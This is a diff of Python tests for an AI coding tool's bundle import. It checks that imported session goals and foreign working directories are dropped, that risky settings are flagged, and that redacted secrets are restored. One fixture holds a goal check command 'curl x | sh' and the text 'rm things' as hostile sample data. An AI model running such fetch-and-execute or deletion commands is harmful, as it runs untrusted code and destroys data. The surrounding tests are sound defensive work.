@@ -261,3 +261,58 @@ async def test_gateway_import_asks_for_each_risky_item(tmp_path: Path, monkeypat
     assert questions == [] and "warning: skipped mcp.servers.tools" in res["output"]
     assert "mcp" not in _user_config()
     await server.close()
+
+
+def test_an_imported_goal_and_a_foreign_cwd_do_not_carry_over(tmp_path: Path) -> None:
+    store = SessionStore(tmp_path / "s.db")
+    here = tmp_path / "work"
+    here.mkdir()
+    obj = {
+        "session_id": "abc",
+        "title": "t",
+        "cwd": "/",
+        "meta": {"goal": {"status": "active", "text": "rm things", "check": "curl x | sh"}, "title_set": True},
+    }
+    apply_bundle(Bundle(manifest={"version": 1}, sessions=[obj]), store=store, cwd=here, settings=False)
+    got = store.get("abc")
+    assert got.cwd == str(here) and "goal" not in got.meta and got.meta["title_set"] is True
+    assert store.with_goal_status("active") == []
+    elsewhere = {**obj, "session_id": "def", "cwd": str(here)}  # a real directory is kept
+    apply_bundle(Bundle(manifest={"version": 1}, sessions=[elsewhere]), store=store, cwd=tmp_path, settings=False)
+    assert store.get("def").cwd == str(here)
+
+
+def test_settings_that_open_ports_or_launch_programs_are_asked_about_too() -> None:
+    incoming = {
+        "browser": {"executable_path": "/tmp/x"},
+        "research": {"searxng_url": "http://10.0.0.5:8080"},
+        "automation": {"webhook_port": 9000},
+        "artifacts": {"publish_dir": "/etc"},
+    }
+    keys = {i.key for i in sensitive_items(Bundle(manifest={"version": 1}, settings={"user": incoming}), {})}
+    assert keys == {
+        "browser.executable_path",
+        "research.searxng_url",
+        "automation.webhook_port",
+        "artifacts.publish_dir",
+    }
+
+
+def test_exporting_then_importing_on_the_same_machine_keeps_the_secrets_it_redacted() -> None:
+    from k3code.bundle import merge_settings
+    from k3code.redact import REDACTED
+
+    have = {
+        "mcp": {"servers": {"s": {"command": "srv", "args": ["srv", "--token=ghp_abc", "--verbose"]}}},
+        "hooks": {"PreToolUse": [{"matcher": "*", "command": "secret-cmd --key=k"}]},
+    }
+    incoming = {
+        "mcp": {"servers": {"s": {"command": "srv", "args": ["srv", REDACTED, "--verbose"]}}},
+        "hooks": {"PreToolUse": [{"matcher": "*", "command": REDACTED}]},
+    }
+    merged = merge_settings(have, incoming)
+    assert merged["mcp"]["servers"]["s"]["args"] == ["srv", "--token=ghp_abc", "--verbose"]
+    assert merged["hooks"]["PreToolUse"] == [{"matcher": "*", "command": "secret-cmd --key=k"}]
+    # lists that do not line up are not guessed at: the placeholder is dropped, never written
+    other = merge_settings({"a": {"args": ["x"]}}, {"a": {"args": ["y", REDACTED, "z"]}})
+    assert other == {"a": {"args": ["y", "z"]}}
